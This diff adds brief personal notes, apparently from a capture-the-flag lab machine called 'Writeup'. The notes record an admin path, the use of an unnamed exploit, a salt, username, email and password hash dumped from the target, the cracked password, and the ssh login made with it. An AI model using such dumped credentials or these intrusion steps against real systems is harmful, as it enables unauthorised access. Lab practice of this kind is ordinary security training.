@@ -1,0 +1,17 @@
+10.10.10.138/writeup/admin
+
+htpassword
+need to enumerate by hand
+
+use the exploit get : 
+ salt for password : 5a599ef579066807
+ username          : jkr
+ email             : jkr@writeup.htb
+ password          : 62def4866937f08cc13bab43bb14e6f7
+
+password decrypted :  5a599ef579066807raykayjay9
+
+ssh jkr@10.10.10.138
+password : raykayjay9 
+
+maybe fail2ban to exploit dunno
